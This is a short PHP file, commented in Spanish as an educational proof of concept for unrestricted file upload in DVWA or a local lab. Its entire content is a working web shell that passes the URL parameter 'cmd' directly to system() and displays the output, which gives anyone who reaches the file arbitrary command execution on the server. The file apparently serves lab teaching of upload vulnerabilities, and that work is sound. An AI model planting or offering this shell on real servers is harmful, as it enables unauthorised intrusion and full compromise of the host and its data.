<?php
// PoC EDUCATIVA — Carga de archivos sin restricción (DVWA / lab local)
// Demuestra que un archivo PHP subido puede ejecutar comandos (RCE).
// Uso:  shell.php?cmd=whoami
echo "<h3>Web shell PoC — archivo PHP ejecutandose en el servidor</h3>";
if (isset($_GET['cmd'])) {
    echo "<b>Comando:</b> " . htmlspecialchars($_GET['cmd']) . "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Web shell activa. Agrega <code>?cmd=whoami</code> a la URL para ejecutar un comando.";
}
?>
